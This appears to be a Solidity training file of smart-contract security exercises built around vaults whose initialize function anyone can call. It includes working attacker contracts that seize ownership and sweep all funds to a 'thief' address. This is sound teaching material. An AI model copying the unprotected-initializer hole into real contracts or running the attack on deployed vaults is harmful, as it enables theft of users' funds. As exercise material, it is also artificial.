// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Take ownership of this vault, then drain it.
A2: Repeat the attack when initialize also sets a treasury address.
*/
contract ExerciseA_InitializableVault {
    address public owner;
    mapping(address => uint256) public balances;

    function initialize(address newOwner) external {
        require(owner == address(0), "already initialized");
        owner = newOwner;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

interface IExerciseA {
    function initialize(address) external;
    function sweep(address payable) external;
}

contract ExerciseA_ExploitTemplate {
    // TODO: implement exploit logic for ExerciseA_InitializableVault.
    function exploit(IExerciseA target, address payable thief) external {
        target.initialize(address(this));
        target.sweep(thief);
    }
}

/*
Exercise Type B (write fix):
Given vulnerable contract + working attacker below, patch the vault only.
Goal: keep owner behavior for honest users while making attack fail.
*/
contract ExerciseB_VulnerableVault {
    address public owner;

    function initialize(address newOwner) external {
        require(owner == address(0), "already initialized");
        owner = newOwner;
    }

    function deposit() external payable {}

    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseB_WorkingAttacker {
    function attack(ExerciseB_VulnerableVault target, address payable thief) external {
        target.initialize(address(this));
        target.sweep(thief);
    }
}
